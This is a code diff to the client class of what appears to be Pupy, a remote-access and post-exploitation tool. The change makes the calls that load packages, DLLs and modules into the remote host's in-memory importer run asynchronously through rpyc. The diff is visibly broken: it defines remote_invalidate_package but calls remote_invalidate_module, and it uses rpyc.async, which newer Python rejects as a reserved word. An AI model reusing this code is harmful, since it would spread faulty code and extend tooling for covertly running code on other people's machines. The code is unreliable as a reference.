@@ -27,6 +27,7 @@ import platform
 import zlib
 
 import msgpack
+import rpyc
 
 from threading import Lock
 
@@ -270,14 +271,20 @@ class PupyClient(object):
             self.pupyimporter = self.conn.pupyimporter
 
         if self.conn.register_remote_cleanup:
+            register_package_request_hook = rpyc.async(self.pupyimporter.register_package_request_hook)
+            register_package_error_hook = rpyc.async(self.pupyimporter.register_package_error_hook)
+
             self.conn.register_remote_cleanup(self.pupyimporter.unregister_package_request_hook)
-            self.pupyimporter.register_package_request_hook(self.remote_load_package)
+            register_package_request_hook(self.remote_load_package)
+
             self.conn.register_remote_cleanup(self.pupyimporter.unregister_package_error_hook)
-            self.pupyimporter.register_package_error_hook(self.remote_print_error)
+            register_package_error_hook(self.remote_print_error)
 
         self.load_dll = getattr(self.pupyimporter, 'load_dll', None)
         self.new_dlls = getattr(self.pupyimporter, 'new_dlls', None)
         self.new_modules = getattr(self.pupyimporter, 'new_modules', None)
+        self.remote_add_package = rpyc.async(self.pupyimporter.pupy_add_package)
+        self.remote_invalidate_package = rpyc.async(self.pupyimporter.invalidate_module)
 
         if self.conn.obtain_call:
             def obtain_call(function, *args, **kwargs):
@@ -424,7 +431,7 @@ class PupyClient(object):
                     if module in self.remotes:
                         del self.remotes[module]
 
-        self.pupyimporter.pupy_add_package(
+        self.remote_add_package(
             packages,
             compressed=True,
             # Use None to prevent import-then-clean-then-search behavior
@@ -438,7 +445,7 @@ class PupyClient(object):
 
     def unload_package(self, module_name):
         if not module_name.endswith(('.so', '.dll', '.pyd')):
-            self.pupyimporter.invalidate_module(module_name)
+            self.remote_invalidate_module(module_name)
 
     def remote_load_package(self, module_name):
         logging.debug('remote_load_package for {} started'.format(module_name))
